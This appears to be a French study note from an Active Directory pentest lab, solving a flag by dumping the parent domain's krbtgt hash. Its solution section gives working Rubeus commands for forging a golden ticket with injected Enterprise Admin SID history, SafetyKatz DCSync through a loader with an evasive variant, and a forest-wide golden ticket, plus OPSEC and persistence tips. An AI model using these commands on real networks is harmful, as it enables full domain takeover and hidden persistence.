---
flag: 30
machine: mcorp-dc
statut: à faire
technique: DCSync (post-EA)
LO: "[[LO19 - krbtgt hash (Enterprise Admin)]]"
---

# F30 · NTLM krbtgt de moneycorp.local

> [!summary] Objectif
> Récupérer le hash NTLM du compte `krbtgt` du **domaine parent** `moneycorp.local` — clé pour Golden Ticket forêt-large.

## Contexte
- **Etape attack flow**: après F29 (EA via SID history) — on peut DCSync **n'importe quel** compte du parent.
- **Ce qu'on a**: TGT forgé enfant→parent avec SIDHistory=EA injecté ; TGS CIFS/mcorp-dc valide.
- **Ce qu'on cherche**: NTLM hash de `moneycorp\krbtgt`.

## Solution

### Etape 1: injecter le contexte EA (rappel de F29)
```powershell
Rubeus.exe golden /rc4:<trust_key> /netbios:dcorp /sid:<child_sid> /sids:<parent_EA_sid> /user:Administrator /service:krbtgt /target:moneycorp.local /ptt
```

### Etape 2: DCSync du krbtgt parent depuis la student VM
```powershell
Loader.exe -path SafetyKatz.exe -args "lsadump::evasive-dcsync /user:moneycorp\krbtgt /domain:moneycorp.local" "exit"
```
→ Voir [[Cheatsheet - Persistence]] pour la variante `Rubeus.exe dcsync`.

### Etape 3 (bonus): forger un Golden Ticket parent
```powershell
Rubeus.exe golden /aes256:<krbtgt_aes256> /sid:<moneycorp_sid> /ldap /user:Administrator /printcmd
```
→ Voir [[Cheatsheet - Tickets Kerberos]].

## Reponse

| Element | Valeur |
|---------|--------|
| NTLM hash de `moneycorp\krbtgt` | `<A REMPLIR DEPUIS LAB>` |

## Pieges et OPSEC
- DCSync exécuté **depuis la student VM** avec le TGT inter-realm injecté — le trafic DRSUAPI sort vers `mcorp-dc`, pas `dcorp-dc`.
- Si `lsadump::evasive-dcsync` refuse : vérifier que le PAC de ton TGT contient bien le SID EA du parent (`klist`, décoder avec Rubeus).
- Event 4662 sur `mcorp-dc` avec Access Mask contenant `DS-Replication-Get-Changes-All` — signal fort côté SIEM.
- Le hash `krbtgt` change rarement — persistance idéale pour Golden Ticket **à l'échelle de la forêt**.

## Refs
- [[Cheatsheet - Persistence]]
- [[Cheatsheet - Tickets Kerberos]]
- [[Cheatsheet - Trusts et forêts]]
- [[LO19 - krbtgt hash (Enterprise Admin)]]
- [[Synthèse - Trusts et forêts]]

[[Flags - Index]] · [[Journal - Index]]
